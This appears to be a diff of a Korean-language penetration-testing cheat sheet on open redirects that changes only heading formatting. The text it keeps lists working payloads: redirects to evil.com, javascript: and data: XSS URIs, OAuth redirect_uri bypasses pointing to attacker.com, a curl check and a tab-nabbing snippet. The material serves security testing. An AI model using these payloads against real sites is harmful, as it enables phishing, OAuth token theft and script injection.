@@ -1,27 +1,27 @@
 ### 기본 페이로드
 
-**서버 redirect (Location 헤더):**
+#### 서버 redirect (Location 헤더)
 - `https://evil.com` (query)
 - `//evil.com` (protocol-relative)
 - `https:\\evil.com` (backslash 변형)
 - `https:%5C%5Cevil.com` (URL encoded backslash)
 - `///evil.com` (slash 다중)
 
-**클라이언트 sink (`location.href`/`window.open`):**
+#### 클라이언트 sink (`location.href`/`window.open`)
 - `javascript:alert(document.domain)` (XSS 변형)
 - `data:text/html,<script>alert(1)</script>`
 - `vbscript:msgbox(1)` (구 IE)
 - `feed:javascript:alert(1)` (feed scheme)
 
-**메타 refresh:**
+#### 메타 refresh
 - `<meta http-equiv="refresh" content="0; url=https://evil.com">` (응답 본문에 외부 URL 출력 시)
 
-**OAuth `redirect_uri`:**
+#### OAuth `redirect_uri`
 - `https://evil.com/callback` (등록 외 URL — strict 검증 시 차단)
 - `https://allowed.com/callback?next=https://evil.com` (open-redirect 결합)
 - `https://allowed.com/callback#@evil.com` (fragment trick)
 
-**검증 실행:**
+#### 검증 실행
 ```
 # 서버 redirect — Location 헤더 확인
 curl -I "https://target/redirect?url=https://evil.com" | grep -i location
@@ -29,7 +29,7 @@ curl -I "https://target/redirect?url=https://evil.com" | grep -i location
 # 클라이언트 sink — Playwright (framenavigated 이벤트)
 ```
 
-**Playwright 검증 (클라이언트):**
+#### Playwright 검증 (클라이언트)
 ```javascript
 const { chromium } = require('playwright');
 (async () => {
@@ -63,7 +63,7 @@ const { chromium } = require('playwright');
 | Whitelist + path 검증 | `https://allowed.com/cb/../../@evil.com`, `https://allowed.com/.@evil.com` |
 | 검증 후 redirect만 차단 (response body는 출력) | `<meta refresh>`로 클라이언트 redirect, JS `location.href` 응답에 포함 |
 
-**OAuth redirect_uri 우회:**
+#### OAuth redirect_uri 우회
 ```
 # 등록 URL prefix만 매칭
 ?redirect_uri=https://allowed.com/cb/../../evil
@@ -80,7 +80,7 @@ const { chromium } = require('playwright');
 ?redirect_uri=https://allowed.com\\@attacker.com
 ```
 
-**Tab-nabbing:**
+#### Tab-nabbing
 ```html
 <a href="https://target/redirect?url=https://attacker/tabnab" target="_blank">click</a>
 <!-- attacker는 window.opener.location = ... 으로 원본 페이지 변조 -->
